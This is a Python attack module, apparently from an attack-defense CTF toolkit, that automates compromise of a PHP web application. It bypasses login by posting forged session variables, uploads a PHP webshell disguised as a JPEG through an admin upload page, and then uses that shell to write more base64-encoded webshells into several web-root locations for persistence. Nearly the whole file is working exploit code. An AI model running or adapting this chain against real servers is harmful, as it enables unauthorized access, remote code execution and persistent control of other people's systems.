'''
This is a default payload
if there is a backdoor in upload/upload.php,and key is pass
The real situation is much more complex
'''
import sys
import base64
sys.path.append('..')
from models.payload import Payload,PayloadFailException
import requests
from models.horse import Horse
from configuration import configuration
from utils import Utils
import re
from modules.execute import execute_command

class P(Payload):
    def attack(self):
        horse = Horse(self.host)
        try:
            s = requests.Session()
            # login
            url = 'http://{0}/index.php'.format(self.host)
            s.post(url,data={
                '_SESSION[login_in]':1,
                '_SESSION[admin]':1,
                '_SESSION[login_time]':99999999999
            },timeout=3)
            
            # upload php
            url = 'http://{0}/admin/upload.php'.format(self.host)
            res = s.post(url,data={
                'thumb_width':300,
                'thumb_heigh':200,
                'submit':'submit'
            },files={
                'up':('temp.php',horse.default,'image/jpeg')
            },timeout=3)
            
            imagePath = re.findall(r'val\(\'(.*?)\'\)',res.text)
            if not imagePath:
                raise PayloadFailException
            # use shell to up more shell
            shellPath = 'http://{host}/upload/{path}'.format(host=self.host,path=imagePath[0])
        except:  
            raise PayloadFailException
        try:
            for location in configuration.shellLocations:
                cmd =  "echo {} | base64 -d > {}".format(Utils.base64(
                horse.default), '/var/www/html'+location)
                execute_command(shellPath,Utils.getPassword(self.host),cmd,'system')
            shellInfo = self.monitor.scan()
            if shellInfo:
                return shellInfo
            else:
                raise PayloadFailException
        except:
            raise PayloadFailException



